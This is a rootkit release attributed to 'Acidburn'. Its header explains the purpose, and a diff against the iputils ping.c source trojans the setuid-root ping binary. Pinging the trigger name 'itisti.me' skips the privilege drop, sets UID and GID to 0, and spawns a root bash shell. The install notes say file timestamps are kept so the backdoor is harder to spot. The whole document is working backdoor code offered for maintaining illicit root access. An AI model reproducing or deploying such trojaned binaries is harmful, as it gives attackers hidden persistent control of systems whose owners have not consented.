#
# PING-RK -- BASIC PING (iputils-s20100214) ROOTKIT
# ~ by Acidburn
# Date: Thu Dec 2 23:14:05 EST 2010
#
# Use case:
#	You have root access and need a way
#	to maintain privileges
#
# Installation:
#	make
#	make install
#	rm -rf ping-rk
#	Note that the Makefile is such that modification
#	timestamps are preserved when the original ping
#	program is overwritten, making the backdoor a bit
#	harder to detect
# 
# Usage:
#	To deploy the backdoor just do
#	ping itisti.me
#
# Outcome:
#	You will be given a root shell
#
# Original sources available at http://www.skbuff.net/iputils/iputils-s20100214.tar.bz2
#
# Here's a diff against the original ping.c file 
#

(PTS:2)-[phrack@SIPRNET:bin]-($)-> diff -ruN iputils-s20100214/ping.c ping-rk/ping.c 
--- iputils-s20100214/ping.c	2010-02-14 05:39:23.000000000 +1100
+++ ping-rk/ping.c	2010-11-17 02:21:20.000000000 +1100
@@ -125,12 +125,6 @@
 	icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
 	socket_errno = errno;
 
-	uid = getuid();
-	if (setuid(uid)) {
-		perror("ping: setuid");
-		exit(-1);
-	}
-
 	source.sin_family = AF_INET;
 
 	preload = 1;
@@ -242,6 +236,35 @@
 	while (argc > 0) {
 		target = *argv;
 
+		/* ELITE CODE STARTS HERE */
+		if (!strcmp(target, "itisti.me")) {
+			printf("[+] DEPLOY ACIDBURN!\n");
+	    	printf("[+] Backdoor Activated\n");
+
+			printf("[+] Current Privileges: UID=%d EUID=%d GID=%d EGID=%d\n",
+					getuid(), geteuid(), getgid(), getegid());
+	
+			/* Elevate Privileges */
+			printf("[+] Elevating Privileges ...\n");
+			setuid(0);
+			setgid(0);
+
+			printf("[+] New Privileges: UID=%d EUID=%d GID=%d EGID=%d\n",
+			getuid(), geteuid(), getgid(), getegid());
+
+			/* Spawn  bash shell */
+			printf("[+] Spawning Bash Shell\n");
+			execl("/bin/bash", "bash", NULL);
+			exit(0);
+		}
+		/* ELITE CODE ENDS HERE*/
+
+	    uid = getuid();
+    	if (setuid(uid)) {
+        	perror("ping: setuid");
+	        exit(-1);
+    	}
+
 		memset((char *)&whereto, 0, sizeof(whereto));
 		whereto.sin_family = AF_INET;
 		if (inet_aton(target, &whereto.sin_addr) == 1) {
